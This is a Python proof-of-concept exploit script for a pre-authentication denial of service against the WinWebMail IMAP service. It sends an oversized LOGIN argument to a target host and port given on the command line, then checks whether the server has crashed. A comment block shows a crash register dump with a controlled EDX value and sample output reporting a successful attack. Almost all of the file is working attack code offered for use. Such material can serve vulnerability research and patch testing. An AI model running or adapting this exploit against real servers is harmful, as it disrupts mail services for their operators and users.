#!/usr/bin/python
##########################################################################
#
# WinWebMail PREAUTH DoS POC 
# Tested on version 3.7.3.2 on Windows XPSP2 English
#
# Bug discovered by Matteo Memelli aka ryujin
# http://www.gray-world.net http://www.be4mind.com
#
# EAX 00000000
# ECX 3FFFF690
# EDX 41414141 <---
# EBX FFFFFFFB
# ESP 0AF3D7A8
# EBP 00B1279C
# ESI 0AF3DD68
# EDI 0AF40000
# EIP 0053AAD9 EMSVR.0053AAD9
#
##########################################################################
#
# bt # ./winwebmail_dos.py -H 192.168.1.3 -P 143
# [+] Connecting to 192.168.1.3 on port 143
# [+] Preparing for DoS...
# * OK IMAP4 on WinWebMail [3.7.3.2] ready.  http://www.winwebmail.net
#
# [+] Evil buf sent!
# [+] Let's wait 5 secs and see if the server crashed...
# [+] Server Di3d:  Connection refused
# [+] The attack was successful!
#
##########################################################################

from socket import *
from optparse import OptionParser
import sys, time

usage =  "%prog -H TARGET_HOST -P TARGET_PORT [-c COMMAND]"
parser = OptionParser(usage=usage)
parser.add_option("-H", "--target_host", type="string",
                  action="store", dest="HOST",
                  help="Target Host")
parser.add_option("-P", "--target_port", type="int",
                  action="store", dest="PORT",
                  help="Target Port")
(options, args) = parser.parse_args()
HOST    = options.HOST
PORT    = options.PORT
if not (HOST and PORT):
   parser.print_help()
   sys.exit()

payload = 'A'*225
print "[+] Connecting to %s on port %d" % (HOST, PORT)
print "[+] Preparing for DoS..."
s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print s.recv(1024)
s.send('0001 LOGIN ' + payload + ' "\r\n')
s.close()
print "[+] Evil buf sent!"
print "[+] Let's wait 5 secs and see if the server crashed..."
time.sleep(5)
try:
   s = socket(AF_INET, SOCK_STREAM)
   s.connect((HOST, PORT))
except error,e:
   print "[+] Server Di3d: ", e[1]
   print "[+] The attack was successful!"
else:
   print "[-] Attack was not successful!"
   s.close()